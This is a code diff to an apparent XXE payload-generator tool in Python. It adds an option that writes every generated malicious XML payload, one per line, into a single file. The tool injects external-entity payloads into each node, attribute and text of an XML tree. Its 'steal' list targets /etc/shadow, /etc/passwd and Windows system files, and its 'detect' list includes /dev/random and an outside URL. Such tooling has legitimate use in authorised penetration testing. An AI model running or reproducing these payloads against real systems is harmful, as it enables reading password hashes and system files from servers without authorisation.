@@ -31,6 +31,10 @@ def parse_options():
     opt_parser.add_option('-m', '--modes', dest='modes', action='append',
                           help='Type of payload to be generated. Available modes:'
                                'S - stealing, D - detection, U - User provided')
+    opt_parser.add_option('-l', '--line-per-payload', dest='single_file_line_per_payload', action='store_true',
+                          default=False, help='If this flag is up,'
+                                              ' there will be a single output file, which contains '
+                                              'ONE payload per LINE.')
 
     return opt_parser.parse_args()[0]
 
@@ -72,13 +76,13 @@ def append_payloads(options):
         'D': [  # detect
                 'file:///dev/random',
                 'http://codepad.org/kfHNgnZj/raw.c',
-        ],
+                ],
         'S': [  # steal
                 'file:///etc/shadow',
                 'file:///etc/passwd',
                 'file:///c:/boot.ini',
                 'file:///c:/winnt/win.ini',
-        ]}
+                ]}
 
     if options.entities is not None and len(options.entities) > 0:
         payloads['U'] = options.entities
@@ -180,6 +184,8 @@ def build_bomb_payload_per_node(options):
     if not options.file_per_node:
         return options
 
+    single_file_payloads = []  # needed if options.single_file_line_per_payload is True
+
     total_files = 0  # number of generated files
     p = 0  # payloads counter
 
@@ -196,8 +202,20 @@ def build_bomb_payload_per_node(options):
                     doctype = build_doctype(tree.getroot().tag, dtd, build_entities([payload], '% ' + mode),
                                             doctype_payload_content)
 
-                    final_filename = '%s_%s_%d_%d.xml' % (filename_prefix, mode, p, i)
-                    save_output_file(final_filename, tree, doctype, options.simple_header)
+                    if not options.single_file_line_per_payload:
+                        final_filename = '%s_%s_%d_%d.xml' % (filename_prefix, mode, p, i)
+                        save_output_file(final_filename, tree, doctype, options.simple_header)
+                    else:
+                        simple_xml_declaration_header = '<?xml version="1.0"?>\n'
+                        result = unescape(
+                            etree.tostring(tree, xml_declaration=not options.simple_header,
+                                           encoding=tree.docinfo.encoding,
+                                           doctype=doctype,
+                                           pretty_print=True).decode(tree.docinfo.encoding))
+                        pld = (simple_xml_declaration_header + result
+                               if options.simple_header else
+                               result).replace('\n', ' ')
+                        single_file_payloads.append(pld)
 
                     doctype_payload_set = True  # no needed anymore for current tree
                     i += 1
@@ -209,8 +227,20 @@ def build_bomb_payload_per_node(options):
                         buf = elem.attrib[attr_name]
                         elem.attrib[attr_name] = build_entity_payload(mode)
 
-                        final_filename = '%s_%s_%d_%d.xml' % (filename_prefix, mode, p, i)
-                        save_output_file(final_filename, tree, doctype, options.simple_header)
+                        if not options.single_file_line_per_payload:
+                            final_filename = '%s_%s_%d_%d.xml' % (filename_prefix, mode, p, i)
+                            save_output_file(final_filename, tree, doctype, options.simple_header)
+                        else:
+                            simple_xml_declaration_header = '<?xml version="1.0"?>\n'
+                            result = unescape(
+                                etree.tostring(tree, xml_declaration=not options.simple_header,
+                                               encoding=tree.docinfo.encoding,
+                                               doctype=doctype,
+                                               pretty_print=True).decode(tree.docinfo.encoding))
+                            pld = (simple_xml_declaration_header + result
+                                   if options.simple_header else
+                                   result).replace('\n', ' ')
+                            single_file_payloads.append(pld)
 
                         elem.attrib[attr_name] = buf
                         i += 1
@@ -218,13 +248,32 @@ def build_bomb_payload_per_node(options):
                     buf = elem.text
                     elem.text = build_entity_payload(mode)
 
-                    final_filename = '%s_%s_%d_%d.xml' % (filename_prefix, mode, p, i)
-                    save_output_file(final_filename, tree, doctype, options.simple_header)
+                    if not options.single_file_line_per_payload:
+                        final_filename = '%s_%s_%d_%d.xml' % (filename_prefix, mode, p, i)
+                        save_output_file(final_filename, tree, doctype, options.simple_header)
+                    else:
+                        simple_xml_declaration_header = '<?xml version="1.0"?>\n'
+                        result = unescape(
+                            etree.tostring(tree, xml_declaration=not options.simple_header,
+                                           encoding=tree.docinfo.encoding,
+                                           doctype=doctype,
+                                           pretty_print=True).decode(tree.docinfo.encoding))
+                        pld = (simple_xml_declaration_header + result
+                               if options.simple_header else
+                               result).replace('\n', ' ')
+                        single_file_payloads.append(pld)
 
                     elem.text = buf
                     i += 1
 
-                total_files += i
+                if not options.single_file_line_per_payload:
+                    total_files += i
+
+            if options.single_file_line_per_payload:
+                total_files += 1
+                filename = '%s_all_payloads_file_%d.xml' % (os.path.basename(tree.getroot().base).split('.')[0],
+                                                            total_files)
+                open(filename, 'w').write('\n'.join(single_file_payloads))
 
         p += 1
 
